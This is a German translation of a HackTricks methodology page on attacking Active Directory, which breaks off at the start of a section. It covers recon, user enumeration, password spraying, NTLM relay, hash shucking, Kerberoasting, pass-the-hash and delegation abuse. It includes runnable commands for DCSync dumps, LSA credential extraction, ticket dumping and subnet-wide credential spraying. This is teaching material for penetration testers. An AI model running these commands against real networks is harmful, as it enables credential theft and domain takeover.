# Active Directory Methodik

{{#include ../../banners/hacktricks-training.md}}

## Grundlegende Übersicht

**Active Directory** dient als grundlegende Technologie, die **Netzwerkadministratoren** ermöglicht, **Domänen**, **Benutzer** und **Objekte** innerhalb eines Netzwerks effizient zu erstellen und zu verwalten. Es ist darauf ausgelegt zu skalieren, indem eine große Anzahl von Benutzern in verwaltbare **Gruppen** und **Untergruppen** organisiert wird und **Zugriffsrechte** auf verschiedenen Ebenen gesteuert werden.

Die Struktur von **Active Directory** besteht aus drei primären Ebenen: **Domänen**, **Trees** und **Forests**. Eine **Domäne** umfasst eine Sammlung von Objekten, wie **Benutzer** oder **Geräte**, die eine gemeinsame Datenbank teilen. **Trees** sind Gruppen dieser Domänen, die eine gemeinsame Struktur teilen, und ein **Forest** stellt die Sammlung mehrerer Trees dar, die durch **Trust-Beziehungen** verbunden sind und die oberste Ebene der organisatorischen Struktur bilden. Spezifische **Zugriffs-** und **Kommunikationsrechte** können auf jeder dieser Ebenen festgelegt werden.

Wichtige Konzepte innerhalb von **Active Directory** umfassen:

1. **Directory** – Beinhaltet alle Informationen zu Active Directory-Objekten.
2. **Object** – Bezeichnet Einheiten im Directory, einschließlich **Benutzern**, **Gruppen** oder **freigegebenen Ordnern**.
3. **Domain** – Dient als Container für Directory-Objekte; mehrere Domains können innerhalb eines **Forest** koexistieren, wobei jede ihre eigene Objektsammlung verwaltet.
4. **Tree** – Eine Gruppierung von Domains, die eine gemeinsame Root-Domain teilen.
5. **Forest** – Die oberste organisatorische Struktur in Active Directory, bestehend aus mehreren Trees mit gegenseitigen **Trust-Beziehungen**.

**Active Directory Domain Services (AD DS)** umfasst eine Reihe von Diensten, die für die zentrale Verwaltung und Kommunikation innerhalb eines Netzwerks wichtig sind. Diese Dienste umfassen:

1. **Domain Services** – Zentralisiert die Datenspeicherung und verwaltet Interaktionen zwischen **Benutzern** und **Domains**, einschließlich **Authentifizierung** und **Suche**.
2. **Certificate Services** – Verantwortlich für die Erstellung, Verteilung und Verwaltung sicherer **digitaler Zertifikate**.
3. **Lightweight Directory Services** – Unterstützt directory-fähige Anwendungen über das **LDAP-Protokoll**.
4. **Directory Federation Services** – Bietet **Single-Sign-On**-Funktionen, um Benutzer über mehrere Webanwendungen in einer Sitzung zu authentifizieren.
5. **Rights Management** – Hilft beim Schutz von urheberrechtlich geschütztem Material, indem die unerlaubte Verbreitung und Nutzung eingeschränkt wird.
6. **DNS Service** – Wichtig für die Auflösung von **Domainnamen**.

Für eine detailliertere Erklärung siehe: [**TechTerms - Active Directory Definition**](https://techterms.com/definition/active_directory)

### **Kerberos Authentication**

Um zu lernen, wie man ein **AD angreift**, muss man den **Kerberos-Authentifizierungsprozess** wirklich gut **verstehen**.\
[**Lies diese Seite, wenn du noch nicht weißt, wie es funktioniert.**](kerberos-authentication.md)

## Cheat Sheet

Du kannst dir viel von [https://wadcoms.github.io/](https://wadcoms.github.io) holen, um einen schnellen Überblick zu bekommen, welche Befehle du zum Enumerieren/Exploiten eines AD ausführen kannst.

> [!WARNING]
> Kerberos-Kommunikation **erfordert einen vollqualifizierten Namen (FQDN)** für Aktionen. Wenn du versuchst, über die IP-Adresse auf eine Maschine zuzugreifen, **wird NTLM und nicht Kerberos verwendet**.

## Recon Active Directory (Keine Creds/Sessions)

Wenn du nur Zugriff auf eine AD-Umgebung hast, aber keine Anmeldeinformationen/Sitzungen besitzt, könntest du:

- **Pentest das Netzwerk:**
- Scanne das Netzwerk, finde Maschinen und offene Ports und versuche, **Schwachstellen auszunutzen** oder **Anmeldeinformationen zu extrahieren** (zum Beispiel können [Drucker sehr interessante Ziele sein](ad-information-in-printers.md)).
- Die DNS-Enumeration kann Informationen über Schlüsselserver in der Domäne liefern wie Web, Drucker, Shares, VPN, Media usw.
- `gobuster dns -d domain.local -t 25 -w /opt/Seclist/Discovery/DNS/subdomain-top2000.txt`
- Schau dir die allgemeine [**Pentesting Methodology**](../../generic-methodologies-and-resources/pentesting-methodology.md) an, um mehr Informationen darüber zu finden, wie man das macht.
- **Überprüfe Null- und Guest-Zugriff auf SMB-Services** (das funktioniert nicht auf modernen Windows-Versionen):
- `enum4linux -a -u "" -p "" <DC IP> && enum4linux -a -u "guest" -p "" <DC IP>`
- `smbmap -u "" -p "" -P 445 -H <DC IP> && smbmap -u "guest" -p "" -P 445 -H <DC IP>`
- `smbclient -U '%' -L //<DC IP> && smbclient -U 'guest%' -L //`
- Ein detaillierterer Leitfaden zum Enumerieren eines SMB-Servers ist hier zu finden:


{{#ref}}
../../network-services-pentesting/pentesting-smb/
{{#endref}}

- **Enumeriere LDAP**
- `nmap -n -sV --script "ldap* and not brute" -p 389 <DC IP>`
- Ein detaillierterer Leitfaden zum Enumerieren von LDAP ist hier zu finden (achte besonders auf den anonymen Zugriff):


{{#ref}}
../../network-services-pentesting/pentesting-ldap.md
{{#endref}}

- **Poison the network**
- Sammle Anmeldeinformationen, indem du **Dienste impersonifizierst mit Responder** (../../generic-methodologies-and-resources/pentesting-network/spoofing-llmnr-nbt-ns-mdns-dns-and-wpad-and-relay-attacks.md)
- Greife Hosts an durch **Missbrauch des Relay-Angriffs** (../../generic-methodologies-and-resources/pentesting-network/spoofing-llmnr-nbt-ns-mdns-dns-and-wpad-and-relay-attacks.md#relay-attack)
- Sammle Anmeldeinformationen, indem du **gefälschte UPnP-Services mit evil-S** exponierst (../../generic-methodologies-and-resources/pentesting-network/spoofing-ssdp-and-upnp-devices.md)[**SDP**](https://medium.com/@nickvangilder/exploiting-multifunction-printers-during-a-penetration-test-engagement-28d3840d8856)
- [**OSINT**](https://book.hacktricks.wiki/en/generic-methodologies-and-resources/external-recon-methodology/index.html):
- Extrahiere Benutzernamen/Namen aus internen Dokumenten, Social Media, Diensten (hauptsächlich Web) innerhalb der Domain-Umgebungen und auch aus öffentlich Verfügbaren.
- Wenn du die vollständigen Namen von Firmenmitarbeitern findest, könntest du verschiedene AD **Benutzerkonventionen** ausprobieren ([**lies das**](https://activedirectorypro.com/active-directory-user-naming-convention/)). Die gebräuchlichsten Konventionen sind: _NameSurname_, _Name.Surname_, _NamSur_ (3 Buchstaben von jedem), _Nam.Sur_, _NSurname_, _N.Surname_, _SurnameName_, _Surname.Name_, _SurnameN_, _Surname.N_, 3 _zufällige Buchstaben und 3 zufällige Zahlen_ (abc123).
- Tools:
- [w0Tx/generate-ad-username](https://github.com/w0Tx/generate-ad-username)
- [urbanadventurer/username-anarchy](https://github.com/urbanadventurer/username-anarchy)

### Benutzer-Enumeration

- **Anonyme SMB/LDAP-Enumeration:** Siehe die Seiten [**pentesting SMB**](../../network-services-pentesting/pentesting-smb/index.html) und [**pentesting LDAP**](../../network-services-pentesting/pentesting-ldap.md).
- **Kerbrute enum**: Wenn ein **ungültiger Benutzername abgefragt** wird, antwortet der Server mit dem **Kerberos-Fehler**code _KRB5KDC_ERR_C_PRINCIPAL_UNKNOWN_, wodurch wir feststellen können, dass der Benutzername ungültig ist. **Gültige Usernamen** lösen entweder ein **TGT in einer AS-REP**-Antwort oder den Fehler _KRB5KDC_ERR_PREAUTH_REQUIRED_ aus, was anzeigt, dass der Benutzer Pre-Authentication durchführen muss.
- **No Authentication gegen MS-NRPC**: Verwendung von auth-level = 1 (keine Authentifizierung) gegen die MS-NRPC (Netlogon)-Schnittstelle auf Domain Controllern. Die Methode ruft die Funktion `DsrGetDcNameEx2` auf, nachdem die MS-NRPC-Schnittstelle gebunden wurde, um zu prüfen, ob der Benutzer oder Computer ohne irgendwelche Anmeldeinformationen existiert. Das Tool [NauthNRPC](https://github.com/sud0Ru/NauthNRPC) implementiert diese Art der Enumeration. Die Forschung ist hier zu finden [hier](https://media.kasperskycontenthub.com/wp-content/uploads/sites/43/2024/05/22190247/A-journey-into-forgotten-Null-Session-and-MS-RPC-interfaces.pdf)
```bash
./kerbrute_linux_amd64 userenum -d lab.ropnop.com --dc 10.10.10.10 usernames.txt #From https://github.com/ropnop/kerbrute/releases

nmap -p 88 --script=krb5-enum-users --script-args="krb5-enum-users.realm='DOMAIN'" <IP>
Nmap -p 88 --script=krb5-enum-users --script-args krb5-enum-users.realm='<domain>',userdb=/root/Desktop/usernames.txt <IP>

msf> use auxiliary/gather/kerberos_enumusers

crackmapexec smb dominio.es  -u '' -p '' --users | awk '{print $4}' | uniq
python3 nauth.py -t target -u users_file.txt #From https://github.com/sud0Ru/NauthNRPC
```
- **OWA (Outlook Web Access) Server**

Wenn Sie einen dieser Server im Netzwerk gefunden haben, können Sie auch **user enumeration against it** durchführen. Zum Beispiel können Sie das Tool [**MailSniper**](https://github.com/dafthack/MailSniper):
```bash
ipmo C:\Tools\MailSniper\MailSniper.ps1
# Get info about the domain
Invoke-DomainHarvestOWA -ExchHostname [ip]
# Enumerate valid users from a list of potential usernames
Invoke-UsernameHarvestOWA -ExchHostname [ip] -Domain [domain] -UserList .\possible-usernames.txt -OutFile valid.txt
# Password spraying
Invoke-PasswordSprayOWA -ExchHostname [ip] -UserList .\valid.txt -Password Summer2021
# Get addresses list from the compromised mail
Get-GlobalAddressList -ExchHostname [ip] -UserName [domain]\[username] -Password Summer2021 -OutFile gal.txt
```
> [!WARNING]
> You can find lists of usernames in [**this github repo**](https://github.com/danielmiessler/SecLists/tree/master/Usernames/Names)  and this one ([**statistically-likely-usernames**](https://github.com/insidetrust/statistically-likely-usernames)).
>
> However, you should have the **name of the people working on the company** from the recon step you should have performed before this. With the name and surname you could used the script [**namemash.py**](https://gist.github.com/superkojiman/11076951) to generate potential valid usernames.

### Knowing one or several usernames

Okay — Sie wissen also, dass Sie bereits einen gültigen Benutzernamen, aber keine Passwörter haben... Versuchen Sie dann:

- [**ASREPRoast**](asreproast.md): Wenn ein Benutzer **nicht** das Attribut _DONT_REQ_PREAUTH_ hat, können Sie eine **AS_REP‑Nachricht** für diesen Benutzer anfordern, die Daten enthält, die mit einer Ableitung des Benutzerpassworts verschlüsselt sind.
- [**Password Spraying**](password-spraying.md): Versuchen Sie die gebräuchlichsten **Passwörter** bei jedem der entdeckten Benutzer — vielleicht verwendet ein Benutzer ein schwaches Passwort (denken Sie an die Passwortrichtlinie!).
- Beachten Sie, dass Sie auch Password Spraying gegen OWA‑Server versuchen können, um Zugriff auf die Mailserver der Benutzer zu erhalten.


{{#ref}}
password-spraying.md
{{#endref}}

### LLMNR/NBT-NS Poisoning

Sie könnten in der Lage sein, einige Challenge‑Hashes zu erhalten, die Sie knacken können, indem Sie bestimmte Protokolle im Netzwerk poisonen:


{{#ref}}
../../generic-methodologies-and-resources/pentesting-network/spoofing-llmnr-nbt-ns-mdns-dns-and-wpad-and-relay-attacks.md
{{#endref}}

### NTLM Relay

Wenn Sie das Active Directory erfolgreich enumeriert haben, verfügen Sie über **mehr E‑Mails und ein besseres Verständnis des Netzwerks**. Möglicherweise können Sie NTLM [**relay attacks**](../../generic-methodologies-and-resources/pentesting-network/spoofing-llmnr-nbt-ns-mdns-dns-and-wpad-and-relay-attacks.md#relay-attack) erzwingen, um Zugriff auf die AD‑Umgebung zu erhalten.

### Steal NTLM Creds

Wenn Sie mit dem **null**- oder **guest**-Benutzer auf andere PCs oder Shares zugreifen können, könnten Sie **Dateien platzieren** (z. B. eine SCF‑Datei), die beim Zugriff eine NTLM‑Authentifizierung gegen Sie auslösen, sodass Sie die **NTLM‑Challenge** abfangen und zum Knacken verwenden können:


{{#ref}}
../ntlm/places-to-steal-ntlm-creds.md
{{#endref}}

### Hash Shucking & NT-Candidate Attacks

**Hash shucking** behandelt jeden NT‑Hash, den Sie bereits besitzen, als Kandidatenpasswort für andere, langsamere Formate, deren Schlüsselmaterial direkt aus dem NT‑Hash abgeleitet wird. Anstatt lange Passphrasen in Kerberos RC4‑Tickets, NetNTLM‑Challenges oder cached credentials zu bruteforcen, speisen Sie die NT‑Hashes in Hashcats NT‑candidate‑Modi und prüfen damit Passwortwiederverwendung, ohne jemals den Klartext zu gewinnen. Das ist besonders wirkungsvoll nach einer Kompromittierung der Domain, bei der Sie Tausende aktueller und historischer NT‑Hashes sammeln können.

Verwenden Sie shucking, wenn:

- Sie ein NT‑Corpus aus DCSync, SAM/SECURITY‑Dumps oder Credential‑Vaults haben und auf Wiederverwendung in anderen Domains/Forests testen müssen.
- Sie RC4‑basiertes Kerberos‑Material (`$krb5tgs$23$`, `$krb5asrep$23$`), NetNTLM‑Antworten oder DCC/DCC2‑Blobs erfassen.
- Sie schnell Wiederverwendung für lange, unknackbare Passphrasen nachweisen und sofort via Pass‑the‑Hash pivoten möchten.

Die Technik **funktioniert nicht** gegen Verschlüsselungstypen, deren Schlüssel nicht der NT‑Hash sind (z. B. Kerberos etype 17/18 AES). Wenn eine Domain nur AES erzwingt, müssen Sie in die regulären Passwort‑Modi zurückkehren.

#### Building an NT hash corpus

- **DCSync/NTDS** – Verwenden Sie `secretsdump.py` mit History, um die größtmögliche Menge an NT‑Hashes (und deren frühere Werte) zu ziehen:

```bash
secretsdump.py <domain>/<user>@<dc_ip> -just-dc-ntlm -history -user-status -outputfile smoke_dump
grep -i ':::' smoke_dump.ntds | awk -F: '{print $4}' | sort -u > nt_candidates.txt
```

History‑Einträge erweitern den Kandidatenpool dramatisch, weil Microsoft bis zu 24 vorherige Hashes pro Account speichern kann. Für weitere Möglichkeiten, NTDS‑Secrets zu sammeln, siehe:

{{#ref}}
dcsync.md
{{#endref}}

- **Endpoint cache dumps** – `nxc smb <ip> -u <local_admin> -p <password> --local-auth --lsa` (oder Mimikatz `lsadump::sam /patch`) extrahiert lokale SAM/SECURITY‑Daten und gecachte Domain‑Logons (DCC/DCC2). Deduplizieren und diese Hashes zur selben `nt_candidates.txt` hinzufügen.
- **Track metadata** – Behalten Sie den Benutzernamen/ die Domain, die jeden Hash geliefert hat (auch wenn die Wortliste nur Hex enthält). Übereinstimmende Hashes sagen Ihnen sofort, welcher Principal ein Passwort wiederverwendet, sobald Hashcat das gewinnende Kandidat ausgibt.
- Bevorzugen Sie Kandidaten aus demselben Forest oder einem vertrauten Forest; das maximiert die Chance auf Übereinstimmung beim Shucking.

#### Hashcat NT-candidate modes

| Hash Type                                | Password Mode | NT-Candidate Mode |
| ---------------------------------------- | ------------- | ----------------- |
| Domain Cached Credentials (DCC)          | 1100          | 31500             |
| Domain Cached Credentials 2 (DCC2)       | 2100          | 31600             |
| NetNTLMv1 / NetNTLMv1+ESS                | 5500          | 27000             |
| NetNTLMv2                                | 5600          | 27100             |
| Kerberos 5 etype 23 AS-REQ Pre-Auth      | 7500          | _N/A_             |
| Kerberos 5 etype 23 TGS-REP (Kerberoast) | 13100         | 35300             |
| Kerberos 5 etype 23 AS-REP               | 18200         | 35400             |

Anmerkungen:

- NT‑Candidate‑Inputs **müssen rohe 32‑hex NT‑Hashes** bleiben. Deaktivieren Sie Rule‑Engines (kein `-r`, keine Hybrid‑Modi), da Mangling das Kandidat‑Schlüsselmaterial beschädigt.
- Diese Modi sind nicht per se schneller, aber der NTLM‑Keyspace (~30.000 MH/s auf einem M3 Max) ist ~100× schneller als Kerberos RC4 (~300 MH/s). Das Testen einer kuratierten NT‑Liste ist deutlich günstiger als die Erkundung des gesamten Passwortraums im langsamen Format.
- Führen Sie immer das **aktuellste Hashcat‑Build** aus (`git clone https://github.com/hashcat/hashcat && make install`), weil die Modi 31500/31600/35300/35400 erst vor Kurzem hinzugefügt wurden.
- Es gibt derzeit keinen NT‑Modus für AS‑REQ Pre‑Auth, und AES‑etypes (19600/19700) benötigen das Klartextpasswort, da deren Schlüssel via PBKDF2 aus UTF‑16LE‑Passwörtern abgeleitet werden, nicht aus rohen NT‑Hashes.

#### Example – Kerberoast RC4 (mode 35300)

1. Erfassen Sie ein RC4‑TGS für ein Ziel‑SPN mit einem niedrig privilegierten Benutzer (siehe die Kerberoast‑Seite für Details):

{{#ref}}
kerberoast.md
{{#endref}}

```bash
GetUserSPNs.py -dc-ip <dc_ip> -request <domain>/<user> -outputfile roastable_TGS
```

2. Shucken Sie das Ticket mit Ihrer NT‑Liste:

```bash
hashcat -m 35300 roastable_TGS nt_candidates.txt
```

Hashcat leitet aus jedem NT‑Kandidaten den RC4‑Key ab und validiert den `$krb5tgs$23$...`‑Blob. Ein Treffer bestätigt, dass das Service‑Konto einen Ihrer vorhandenen NT‑Hashes verwendet.

3. Pivotieren Sie sofort via PtH:

```bash
nxc smb <dc_ip> -u roastable -H <matched_nt_hash>
```

Optional können Sie den Klartext später mit `hashcat -m 1000 <matched_hash> wordlists/` wiederherstellen, falls erforderlich.

#### Example – Cached credentials (mode 31600)

1. Dumpen Sie gecachte Logons von einer kompromittierten Workstation:

```bash
nxc smb <host_ip> -u localadmin -p '<password>' --local-auth --lsa > lsa_dump.txt
```

2. Kopieren Sie die DCC2‑Zeile für den interessanten Domain‑Benutzer in `dcc2_highpriv.txt` und shucken Sie sie:

```bash
hashcat -m 31600 dcc2_highpriv.txt nt_candidates.txt
```

3. Ein erfolgreicher Treffer liefert den NT‑Hash, der bereits in Ihrer Liste bekannt ist, und belegt, dass der gecachte Benutzer ein Passwort wiederverwendet. Verwenden Sie ihn direkt für PtH (`nxc smb <dc_ip> -u highpriv -H <hash>`) oder brute‑forcen Sie ihn im schnellen NTLM‑Modus, um den Klartext zu finden.

Dasselbe Workflow gilt für NetNTLM Challenge‑Responses (`-m 27000/27100`) und DCC (`-m 31500`). Sobald eine Übereinstimmung identifiziert ist, können Sie Relay‑Attacks, SMB/WMI/WinRM PtH starten oder den NT‑Hash offline mit Masks/Rules erneut knacken.



## Enumerating Active Directory WITH credentials/session

Für diese Phase müssen Sie die Anmeldedaten oder eine Sitzung eines gültigen Domain‑Accounts kompromittiert haben. Wenn Sie gültige Anmeldedaten oder eine Shell als Domain‑Benutzer haben, **denken Sie daran, dass die zuvor genannten Optionen weiterhin Möglichkeiten sind, andere Benutzer zu kompromittieren**.

Bevor Sie mit der authentifizierten Enumeration beginnen, sollten Sie das **Kerberos double hop problem** kennen.


{{#ref}}
kerberos-double-hop-problem.md
{{#endref}}

### Enumeration

Die Kompromittierung eines Accounts ist ein **großer Schritt**, um die gesamte Domain weiter zu kompromittieren, denn Sie können jetzt mit der **Active Directory‑Enumeration** beginnen:

Bezüglich [**ASREPRoast**](asreproast.md) können Sie nun alle möglichen verwundbaren Benutzer finden; und bezüglich [**Password Spraying**](password-spraying.md) können Sie eine **Liste aller Benutzernamen** erstellen und das Passwort des kompromittierten Accounts, leere Passwörter oder vielversprechende neue Passwörter testen.

- Sie könnten das [**CMD to perform a basic recon**](../basic-cmd-for-pentesters.md#domain-info) verwenden
- Sie können auch [**powershell for recon**](../basic-powershell-for-pentesters/index.html) verwenden, was stealthier ist
- Sie können auch [**use powerview**](../basic-powershell-for-pentesters/powerview.md), um detailliertere Informationen zu extrahieren
- Ein weiteres großartiges Recon‑Tool in Active Directory ist [**BloodHound**](bloodhound.md). Es ist **nicht sehr stealthy** (abhängig von den verwendeten Collection‑Methoden), aber **wenn Ihnen das egal ist**, sollten Sie es unbedingt ausprobieren. Finden Sie, wo Benutzer RDP können, Pfade zu anderen Gruppen etc.
- **Weitere automatisierte AD‑Enumeration‑Tools sind:** [**AD Explorer**](bloodhound.md#ad-explorer)**,** [**ADRecon**](bloodhound.md#adrecon)**,** [**Group3r**](bloodhound.md#group3r)**,** [**PingCastle**](bloodhound.md#pingcastle)**.**
- [**DNS records of the AD**](ad-dns-records.md), da diese interessante Informationen enthalten können.
- Ein **GUI‑Werkzeug**, mit dem Sie das Verzeichnis enumerieren können, ist **AdExplorer.exe** aus der **SysInternal** Suite.
- Sie können auch die LDAP‑Datenbank mit **ldapsearch** durchsuchen, um nach Anmeldeinformationen in den Feldern _userPassword_ & _unixUserPassword_ oder sogar in _Description_ zu suchen. Vgl. [Password in AD User comment on PayloadsAllTheThings](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Active%20Directory%20Attack.md#password-in-ad-user-comment) für weitere Methoden.
- Wenn Sie **Linux** verwenden, können Sie die Domain auch mit [**pywerview**](https://github.com/the-useless-one/pywerview) enumerieren.
- Sie können auch automatisierte Tools ausprobieren wie:
- [**tomcarver16/ADSearch**](https://github.com/tomcarver16/ADSearch)
- [**61106960/adPEAS**](https://github.com/61106960/adPEAS)
- **Extracting all domain users**

Es ist sehr einfach, alle Domain‑Benutzernamen von Windows zu erhalten (`net user /domain`, `Get-DomainUser` oder `wmic useraccount get name,sid`). Unter Linux können Sie verwenden: `GetADUsers.py -all -dc-ip 10.10.10.110 domain.com/username` oder `enum4linux -a -u "user" -p "password" <DC IP>`

> Auch wenn dieser Enumeration‑Abschnitt klein wirkt, ist er der wichtigste Teil von allen. Öffnen Sie die Links (insbesondere die zu cmd, powershell, powerview und BloodHound), lernen Sie, wie man eine Domain enumeriert, und üben Sie, bis Sie sich sicher fühlen. Während eines Assessments ist dies der Schlüsselmoment, um Ihren Weg zu DA zu finden oder zu entscheiden, dass nichts getan werden kann.

### Kerberoast

Kerberoasting beinhaltet das Erlangen von **TGS‑Tickets**, die von Services verwendet werden, die an Benutzerkonten gebunden sind, und das Offline‑Knacken ihrer Verschlüsselung — welche auf Benutzerpasswörtern basiert.

Mehr dazu in:


{{#ref}}
kerberoast.md
{{#endref}}

### Remote connexion (RDP, SSH, FTP, Win-RM, etc)

Sobald Sie Anmeldedaten erlangt haben, können Sie prüfen, ob Sie Zugriff auf eine **Maschine** haben. Dafür können Sie **CrackMapExec** verwenden, um zu versuchen, sich mit verschiedenen Protokollen auf mehreren Servern entsprechend Ihren Port‑Scans zu verbinden.

### Local Privilege Escalation

Wenn Sie Anmeldedaten oder eine Sitzung als normaler Domain‑Benutzer kompromittiert haben und mit diesem Benutzer **Zugriff** auf eine beliebige Maschine in der Domain haben, sollten Sie versuchen, lokal Privilegien zu eskalieren und nach Anmeldeinformationen zu durchsuchen. Nur mit lokalen Administratorrechten können Sie **Hashes anderer Benutzer** im Speicher (LSASS) und lokal (SAM) dumpen.

Es gibt eine komplette Seite in diesem Buch über [**local privilege escalation in Windows**](../windows-local-privilege-escalation/index.html) und eine [**Checkliste**](../checklist-windows-privilege-escalation.md). Vergessen Sie auch nicht, [**WinPEAS**](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite) zu verwenden.

### Current Session Tickets

Es ist sehr **unwahrscheinlich**, dass Sie **Tickets** im aktuellen Benutzer finden, die Ihnen die Berechtigung geben, auf unerwartete Ressourcen zuzugreifen, aber Sie können Folgendes prüfen:
```bash
## List all tickets (if not admin, only current user tickets)
.\Rubeus.exe triage
## Dump the interesting one by luid
.\Rubeus.exe dump /service:krbtgt /luid:<luid> /nowrap
[IO.File]::WriteAllBytes("ticket.kirbi", [Convert]::FromBase64String("<BASE64_TICKET>"))
```
### NTLM Relay

Wenn du es geschafft hast, die active directory zu enumerieren, wirst du über **mehr E-Mails und ein besseres Verständnis des Netzwerks** verfügen. Möglicherweise kannst du NTLM [**relay attacks**](../../generic-methodologies-and-resources/pentesting-network/spoofing-llmnr-nbt-ns-mdns-dns-and-wpad-and-relay-attacks.md#relay-attack)**.**

### Sucht nach Creds in Computer Shares | SMB Shares

Jetzt, da du einige basic credentials hast, solltest du prüfen, ob du **irgendwelche interessanten Dateien finden kannst, die innerhalb des AD geteilt werden**. Das könntest du manuell tun, aber es ist eine sehr langweilige, repetitive Aufgabe (und noch mehr, wenn du Hunderte von Docs findest, die du überprüfen musst).

[**Follow this link to learn about tools you could use.**](../../network-services-pentesting/pentesting-smb/index.html#domain-shared-folders-search)

### Steal NTLM Creds

Wenn du auf andere PCs oder shares zugreifen kannst, könntest du **Dateien platzieren** (wie eine SCF-Datei), die, wenn sie irgendwie geöffnet werden, eine **NTLM-Authentifizierung gegen dich auslösen**, sodass du die **NTLM-Challenge stehlen** kannst, um sie zu cracken:


{{#ref}}
../ntlm/places-to-steal-ntlm-creds.md
{{#endref}}

### CVE-2021-1675/CVE-2021-34527 PrintNightmare

Diese Schwachstelle erlaubte es jedem authentifizierten Benutzer, **den domain controller zu kompromittieren**.


{{#ref}}
printnightmare.md
{{#endref}}

## Privilege escalation on Active Directory WITH privileged credentials/session

**Für die folgenden Techniken reicht ein normaler domain user nicht aus, du brauchst spezielle privileges/credentials, um diese Angriffe durchzuführen.**

### Hash extraction

Hoffentlich ist es dir gelungen, **ein lokales admin-Konto zu kompromittieren** mit [AsRepRoast](asreproast.md), [Password Spraying](password-spraying.md), [Kerberoast](kerberoast.md), [Responder](../../generic-methodologies-and-resources/pentesting-network/spoofing-llmnr-nbt-ns-mdns-dns-and-wpad-and-relay-attacks.md) inklusive Relaying, [EvilSSDP](../../generic-methodologies-and-resources/pentesting-network/spoofing-ssdp-and-upnp-devices.md), [escalating privileges locally](../windows-local-privilege-escalation/index.html).\
Dann ist es Zeit, alle Hashes im Speicher und lokal zu dumpen.\
[**Read this page about different ways to obtain the hashes.**](https://github.com/carlospolop/hacktricks/blob/master/windows-hardening/active-directory-methodology/broken-reference/README.md)

### Pass the Hash

**Sobald du den Hash eines Benutzers hast**, kannst du ihn zur **Impersonation** nutzen.\
Du musst ein **Tool** verwenden, das die **NTLM-Authentifizierung mit** diesem **Hash durchführt**, **oder** du könntest ein neues **sessionlogon** erstellen und den **Hash** in den **LSASS** **injecten**, sodass bei jeder **NTLM-Authentifizierung** dieser **Hash verwendet wird.** Die letzte Option ist das, was mimikatz macht.\
[**Read this page for more information.**](../ntlm/index.html#pass-the-hash)

### Over Pass the Hash/Pass the Key

Dieser Angriff zielt darauf ab, **den NTLM-Hash eines Benutzers zu verwenden, um Kerberos-Tickets anzufordern**, als Alternative zum üblichen Pass The Hash über das NTLM-Protokoll. Daher kann dies besonders **nützlich in Netzwerken sein, in denen das NTLM-Protokoll deaktiviert ist** und nur **Kerberos** als Authentifizierungsprotokoll erlaubt ist.


{{#ref}}
over-pass-the-hash-pass-the-key.md
{{#endref}}

### Pass the Ticket

Bei der **Pass The Ticket (PTT)**-Angriffsmethode stehlen Angreifer **ein Authentifizierungs-Ticket eines Benutzers** anstelle seines Passworts oder Hash-Werte. Dieses gestohlene Ticket wird dann verwendet, um den Benutzer zu **impersonate**, wodurch unautorisiert auf Ressourcen und Dienste im Netzwerk zugegriffen werden kann.


{{#ref}}
pass-the-ticket.md
{{#endref}}

### Credentials Reuse

Wenn du den **Hash** oder das **Password** eines **local administrator** hast, solltest du versuchen, dich **lokal auf anderen PCs einzuloggen**.
```bash
# Local Auth Spray (once you found some local admin pass or hash)
## --local-auth flag indicate to only try 1 time per machine
crackmapexec smb --local-auth 10.10.10.10/23 -u administrator -H 10298e182387f9cab376ecd08491764a0 | grep +
```
> [!WARNING]
> Beachte, dass das ziemlich **auffällig** ist und **LAPS** es **mildern** würde.

### MSSQL Abuse & Trusted Links

Wenn ein Benutzer Berechtigungen hat, **MSSQL-Instanzen zuzugreifen**, könnte er diese nutzen, um **Befehle auszuführen** auf dem MSSQL-Host (falls dieser als SA läuft), den NetNTLM-**hash** zu **stehlen** oder sogar einen **relay** **attack** durchzuführen.\
Außerdem, wenn eine MSSQL-Instanz von einer anderen als vertrauenswürdig (database link) eingestuft ist: Wenn der Benutzer Rechte auf der vertrauenswürdigen Datenbank hat, kann er **die Vertrauensbeziehung nutzen, um auch in der anderen Instanz Abfragen auszuführen**. Diese Vertrauensstellungen können verkettet werden und irgendwann könnte der Benutzer eine fehlkonfigurierte Datenbank finden, auf der er Befehle ausführen kann.\
**Die Links zwischen Datenbanken funktionieren sogar über Forest-Trusts hinweg.**


{{#ref}}
abusing-ad-mssql.md
{{#endref}}

### IT asset/deployment platforms abuse

Drittanbieter-Inventar- und Deployment-Suiten bieten oft mächtige Pfade zu Credentials und Code-Ausführung. Siehe:

{{#ref}}
sccm-management-point-relay-sql-policy-secrets.md
{{#endref}}

{{#ref}}
lansweeper-security.md
{{#endref}}

### Unconstrained Delegation

Wenn du ein Computerobjekt mit dem Attribut [ADS_UF_TRUSTED_FOR_DELEGATION](<https://msdn.microsoft.com/en-us/library/aa772300(v=vs.85).aspx>) findest und du Domain-Rechte auf dem Computer hast, wirst du in der Lage sein, TGTs aus dem Speicher jedes Benutzers zu extrahieren, der sich an dem Computer anmeldet.\
Also, wenn ein **Domain Admin** sich an dem Computer anmeldet, kannst du sein TGT auslesen und ihn mittels [Pass the Ticket](pass-the-ticket.md) impersonifizieren.\
Dank constrained delegation könntest du sogar **automatisch einen Print Server kompromittieren** (hoffentlich ist es ein DC).


{{#ref}}
unconstrained-delegation.md
{{#endref}}

### Constrained Delegation

Wenn einem Benutzer oder Computer "Constrained Delegation" erlaubt ist, kann er **jeden Benutzer impersonifizieren, um auf bestimmte Dienste auf einem Computer zuzugreifen**.\
Wenn du dann den **Hash kompromittierst** dieses Benutzers/Computers, wirst du in der Lage sein, **jeden Benutzer zu impersonifizieren** (auch Domain Admins), um auf bestimmte Dienste zuzugreifen.


{{#ref}}
constrained-delegation.md
{{#endref}}

### Resourced-based Constrain Delegation

Das Haben von **WRITE**-Rechten auf ein Active Directory-Objekt eines entfernten Computers ermöglicht die Erlangung von Code-Ausführung mit **erhöhten Rechten**:


{{#ref}}
resource-based-constrained-delegation.md
{{#endref}}

### Permissions/ACLs Abuse

Der kompromittierte Benutzer könnte einige **interessante Rechte auf Domänenobjekten** besitzen, die es dir erlauben könnten, **seitlich zu bewegen**/**Privilegien zu eskalieren**.


{{#ref}}
acl-persistence-abuse/
{{#endref}}

### Printer Spooler service abuse

Das Entdecken eines **Spooler-Dienstes, der im Domain-Umfeld lauscht**, kann **missbraucht** werden, um **neue Credentials zu erlangen** und **Privilegien zu eskalieren**.


{{#ref}}
printers-spooler-service-abuse.md
{{#endref}}

### Third party sessions abuse

